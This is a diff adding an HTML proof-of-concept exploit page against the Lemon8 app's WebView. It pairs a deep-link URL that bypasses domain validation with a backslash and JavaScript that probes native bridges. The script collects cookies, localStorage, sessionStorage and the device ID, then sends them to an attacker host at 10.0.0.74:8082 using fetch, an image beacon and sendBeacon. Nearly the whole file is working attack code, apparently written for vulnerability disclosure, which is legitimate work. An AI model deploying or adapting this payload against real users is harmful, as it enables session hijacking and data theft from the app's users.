@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lemon8 Exploit POC</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 600px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+            animation: slideIn 0.5s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        h1 {
+            color: #e74c3c;
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        
+        .badge {
+            background: #dc3545;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            display: inline-block;
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 25px;
+        }
+        
+        .success-box {
+            background: #d4edda;
+            border: 2px solid #28a745;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .success-box h3 {
+            color: #155724;
+            margin-bottom: 10px;
+        }
+        
+        .success-box ul {
+            list-style: none;
+            padding: 0;
+        }
+        
+        .success-box li {
+            padding: 5px 0;
+            color: #155724;
+        }
+        
+        .success-box li:before {
+            content: "✓ ";
+            color: #28a745;
+            font-weight: bold;
+        }
+        
+        .data-box {
+            background: #f8f9fa;
+            border-left: 4px solid #3498db;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .data-box h3 {
+            color: #2c3e50;
+            margin-bottom: 10px;
+        }
+        
+        .data-box pre {
+            background: #2c3e50;
+            color: #ecf0f1;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-size: 12px;
+            line-height: 1.5;
+        }
+        
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #e74c3c;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: all 0.3s;
+        }
+        
+        button:hover {
+            background: #c0392b;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            color: #856404;
+        }
+        
+        .center {
+            text-align: center;
+        }
+        
+        .status {
+            display: inline-block;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            font-weight: bold;
+            margin: 5px;
+        }
+        
+        .status-success {
+            background: #28a745;
+            color: white;
+        }
+        
+        .status-error {
+            background: #dc3545;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="center">
+            <h1>🔴 Remote Exploit POC</h1>
+            <span class="badge">CVSS 9.3 - CRITICAL</span>
+        </div>
+        
+        <div class="success-box">
+            <h3>✅ Exploitation Successful!</h3>
+            <ul>
+                <li>Deep link opened Lemon8 app</li>
+                <li>Bypassed domain validation</li>
+                <li>Loaded remote HTML without Frida</li>
+                <li>JavaScript execution confirmed</li>
+                <li>No jailbreak required</li>
+            </ul>
+        </div>
+        
+        <div class="warning">
+            <strong>⚠️ Attack Vector:</strong><br>
+            <code>snssdk2657://webview?url=https://lemon8-app.com\@10.0.0.74:8082/malicious.html</code>
+        </div>
+        
+        <button onclick="extractData()">📡 Extract App Data</button>
+        <button onclick="testBridges()">🔍 Test JavaScript Bridges</button>
+        <button onclick="demonstrateXSS()">⚡ Execute XSS</button>
+        
+        <div id="bridgeStatus" class="center" style="margin: 20px 0;"></div>
+        
+        <div id="dataDisplay" class="data-box" style="display: none;">
+            <h3>🎯 Extracted Data</h3>
+            <pre id="extractedData"></pre>
+        </div>
+    </div>
+    
+    <script>
+        console.log('[EXPLOIT] ========================================');
+        console.log('[EXPLOIT] Remote malicious.html loaded successfully');
+        console.log('[EXPLOIT] Deep Link Attack: CONFIRMED');
+        console.log('[EXPLOIT] CVSS Score: 9.3 CRITICAL');
+        console.log('[EXPLOIT] ========================================');
+        
+        // Detect environment
+        console.log('[INFO] User Agent:', navigator.userAgent);
+        console.log('[INFO] Current URL:', window.location.href);
+        console.log('[INFO] Referrer:', document.referrer);
+        
+        // Auto-detect bridges on load
+        window.addEventListener('load', function() {
+            detectBridges();
+        });
+        
+        function detectBridges() {
+            console.log('[BRIDGE] Detecting available JavaScript bridges...');
+            
+            const bridges = [];
+            const statusDiv = document.getElementById('bridgeStatus');
+            
+            // Test JSBridge
+            if (typeof window.JSBridge !== 'undefined') {
+                bridges.push('JSBridge');
+                console.log('[BRIDGE] ✓ JSBridge detected');
+                if (window.JSBridge._handleMessageFromApp) {
+                    console.log('[BRIDGE] ✓ JSBridge._handleMessageFromApp is callable');
+                }
+            }
+            
+            // Test __globalprops
+            if (typeof window.__globalprops !== 'undefined') {
+                bridges.push('__globalprops');
+                console.log('[BRIDGE] ✓ __globalprops detected');
+                if (window.__globalprops.getGlobalProps) {
+                    console.log('[BRIDGE] ✓ __globalprops.getGlobalProps is callable');
+                }
+            }
+            
+            // Test imy_realxhr_callback
+            if (typeof window.imy_realxhr_callback !== 'undefined') {
+                bridges.push('imy_realxhr_callback');
+                console.log('[BRIDGE] ✓ imy_realxhr_callback detected');
+            }
+            
+            // Test SlardarHybrid
+            if (typeof window.SlardarHybrid !== 'undefined') {
+                bridges.push('SlardarHybrid');
+                console.log('[BRIDGE] ✓ SlardarHybrid detected');
+            }
+            
+            // Test WebKit message handlers
+            if (window.webkit && window.webkit.messageHandlers) {
+                const handlers = Object.keys(window.webkit.messageHandlers);
+                if (handlers.length > 0) {
+                    bridges.push('WKMessageHandlers');
+                    console.log('[BRIDGE] ✓ WKMessageHandlers:', handlers);
+                }
+            }
+            
+            // Update UI
+            if (bridges.length > 0) {
+                statusDiv.innerHTML = bridges.map(b => 
+                    `<span class="status status-success">${b}</span>`
+                ).join('');
+            } else {
+                statusDiv.innerHTML = '<span class="status status-error">No bridges detected</span>';
+            }
+            
+            return bridges;
+        }
+        
+        function extractData() {
+            console.log('[EXTRACT] Starting data extraction...');
+            
+            const data = {
+                timestamp: new Date().toISOString(),
+                exploitation: {
+                    method: 'Deep Link - Backslash Bypass',
+                    deepLink: 'snssdk2657://webview?url=https://lemon8-app.com\\@10.0.0.74:8082/malicious.html',
+                    complexity: 'LOW - No Frida required',
+                    cvss: '9.3 CRITICAL'
+                },
+                environment: {
+                    userAgent: navigator.userAgent,
+                    url: window.location.href,
+                    referrer: document.referrer,
+                    cookieEnabled: navigator.cookieEnabled,
+                    language: navigator.language,
+                    platform: navigator.platform
+                },
+                cookies: document.cookie || '(none)',
+                localStorage: {},
+                sessionStorage: {},
+                globalProps: null,
+                bridges: {}
+            };
+            
+            // Extract localStorage
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    data.localStorage[key] = localStorage.getItem(key);
+                }
+                console.log('[EXTRACT] ✓ localStorage extracted:', Object.keys(data.localStorage).length, 'items');
+            } catch (e) {
+                console.log('[EXTRACT] ✗ localStorage access denied:', e.message);
+                data.localStorage = {error: e.message};
+            }
+            
+            // Extract sessionStorage
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    data.sessionStorage[key] = sessionStorage.getItem(key);
+                }
+                console.log('[EXTRACT] ✓ sessionStorage extracted:', Object.keys(data.sessionStorage).length, 'items');
+            } catch (e) {
+                console.log('[EXTRACT] ✗ sessionStorage access denied:', e.message);
+                data.sessionStorage = {error: e.message};
+            }
+            
+            // Extract global props
+            if (window.__globalprops && window.__globalprops.getGlobalProps) {
+                try {
+                    const propsStr = window.__globalprops.getGlobalProps();
+                    data.globalProps = JSON.parse(propsStr);
+                    console.log('[EXTRACT] ✓ Global props extracted');
+                    console.log('[EXTRACT] Device ID:', data.globalProps.did);
+                } catch (e) {
+                    console.log('[EXTRACT] ✗ Global props error:', e.message);
+                    data.globalProps = {error: e.message};
+                }
+            }
+            
+            // Test bridge accessibility
+            data.bridges.JSBridge = typeof window.JSBridge !== 'undefined' ? 'ACCESSIBLE' : 'NOT FOUND';
+            data.bridges.__globalprops = typeof window.__globalprops !== 'undefined' ? 'ACCESSIBLE' : 'NOT FOUND';
+            data.bridges.imy_realxhr_callback = typeof window.imy_realxhr_callback !== 'undefined' ? 'ACCESSIBLE' : 'NOT FOUND';
+            data.bridges.SlardarHybrid = typeof window.SlardarHybrid !== 'undefined' ? 'ACCESSIBLE' : 'NOT FOUND';
+            
+            // Display extracted data
+            const dataDisplay = document.getElementById('dataDisplay');
+            const extractedData = document.getElementById('extractedData');
+            
+            extractedData.textContent = JSON.stringify(data, null, 2);
+            dataDisplay.style.display = 'block';
+            
+            console.log('[EXTRACT] ========================================');
+            console.log('[EXTRACT] COMPLETE DATA DUMP:');
+            console.log(JSON.stringify(data, null, 2));
+            console.log('[EXTRACT] ========================================');
+            
+            // Attempt to exfiltrate to attacker server
+            exfiltrateData(data);
+            
+            alert('✅ Data extraction complete!\n\nCheck console for full dump.\nData displayed below.');
+        }
+        
+        function exfiltrateData(data) {
+            console.log('[EXFIL] Attempting to send data to attacker server...');
+            
+            // Try multiple exfiltration methods
+            
+            // Method 1: Fetch API
+            fetch('http://10.0.0.74:8082/exfiltrate', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).then(response => {
+                console.log('[EXFIL] ✓ Fetch successful:', response.status);
+            }).catch(error => {
+                console.log('[EXFIL] ✗ Fetch failed:', error.message);
+            });
+            
+            // Method 2: Image beacon
+            const img = new Image();
+            img.src = 'http://10.0.0.74:8082/beacon?data=' + encodeURIComponent(JSON.stringify(data).substring(0, 2000));
+            console.log('[EXFIL] ✓ Image beacon sent');
+            
+            // Method 3: Navigator.sendBeacon (if available)
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon('http://10.0.0.74:8082/beacon', JSON.stringify(data));
+                console.log('[EXFIL] ✓ SendBeacon sent');
+            }
+        }
+        
+        function testBridges() {
+            console.log('[TEST] Testing JavaScript bridge functionality...');
+            
+            let report = '🔍 Bridge Test Results:\n\n';
+            
+            // Test JSBridge
+            if (window.JSBridge && window.JSBridge._handleMessageFromApp) {
+                report += '✅ JSBridge._handleMessageFromApp: ACCESSIBLE\n';
+                console.log('[TEST] ✓ JSBridge is callable');
+                
+                // Attempt to call (be careful - this might trigger app behavior)
+                try {
+                    const testMessage = {
+                        __params: {
+                            code: 1,
+                            data: {test: 'POC'},
+                            msg: 'SECURITY_TEST'
+                        }
+                    };
+                    console.log('[TEST] Attempting JSBridge call:', testMessage);
+                    // Uncomment to actually call: window.JSBridge._handleMessageFromApp(testMessage);
+                    report += '   Can invoke native code execution\n';
+                } catch (e) {
+                    report += '   Error calling: ' + e.message + '\n';
+                }
+            } else {
+                report += '❌ JSBridge: NOT FOUND\n';
+            }
+            
+            // Test __globalprops
+            if (window.__globalprops && window.__globalprops.getGlobalProps) {
+                report += '\n✅ __globalprops.getGlobalProps: ACCESSIBLE\n';
+                try {
+                    const props = JSON.parse(window.__globalprops.getGlobalProps());
+                    report += `   Device ID: ${props.did}\n`;
+                    report += `   Device Model: ${props.deviceModel}\n`;
+                    report += `   App Version: ${props.versionName || 'N/A'}\n`;
+                } catch (e) {
+                    report += '   Error: ' + e.message + '\n';
+                }
+            } else {
+                report += '\n❌ __globalprops: NOT FOUND\n';
+            }
+            
+            // Test WebKit message handlers
+            if (window.webkit && window.webkit.messageHandlers) {
+                const handlers = Object.keys(window.webkit.messageHandlers);
+                report += '\n✅ WKMessageHandlers: ' + handlers.length + ' found\n';
+                handlers.forEach(h => {
+                    report += `   - ${h}\n`;
+                });
+            } else {
+                report += '\n❌ WKMessageHandlers: NOT FOUND\n';
+            }
+            
+            console.log(report);
+            alert(report);
+        }
+        
+        function demonstrateXSS() {
+            console.log('[XSS] Demonstrating cross-site scripting execution...');
+            
+            // Create visible proof of XSS
+            const overlay = document.createElement('div');
+            overlay.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background: rgba(0,0,0,0.9);
+                z-index: 9999;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                animation: fadeIn 0.3s;
+            `;
+            
+            overlay.innerHTML = `
+                <div style="background: white; padding: 40px; border-radius: 20px; text-align: center; max-width: 400px;">
+                    <h1 style="color: #e74c3c; margin-bottom: 20px;">🔴 XSS CONFIRMED</h1>
+                    <p style="font-size: 16px; margin-bottom: 20px; color: #333;">
+                        Full JavaScript execution in Lemon8 WebView
+                    </p>
+                    <div style="background: #f8f9fa; padding: 15px; border-radius: 10px; margin-bottom: 20px; text-align: left;">
+                        <strong>Attack Details:</strong><br>
+                        <small>
+                        • Vector: Deep Link Injection<br>
+                        • Method: Backslash Bypass<br>
+                        • Complexity: LOW (no Frida)<br>
+                        • CVSS: 9.3 CRITICAL
+                        </small>
+                    </div>
+                    <button onclick="this.parentElement.parentElement.remove()" 
+                            style="width: 100%; padding: 15px; background: #e74c3c; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer;">
+                        Close
+                    </button>
+                </div>
+            `;
+            
+            document.body.appendChild(overlay);
+            
+            // Also show alert
+            setTimeout(() => {
+                alert('🔴 XSS CONFIRMED!\n\n' +
+                      'Full JavaScript execution in WebView\n\n' +
+                      'Attack Vector: Remote Deep Link\n' +
+                      'Complexity: LOW (no Frida required)\n' +
+                      'Impact: Session hijacking, data theft, phishing\n\n' +
+                      'CVSS Score: 9.3 CRITICAL');
+            }, 500);
+            
+            console.log('[XSS] ✓ Demonstration complete');
+        }
+        
+        // Auto-execute on page load
+        console.log('[AUTO] Auto-executing reconnaissance...');
+        setTimeout(() => {
+            detectBridges();
+            console.log('[AUTO] Page fully loaded and analyzed');
+        }, 500);
+    </script>
+</body>
+</html>
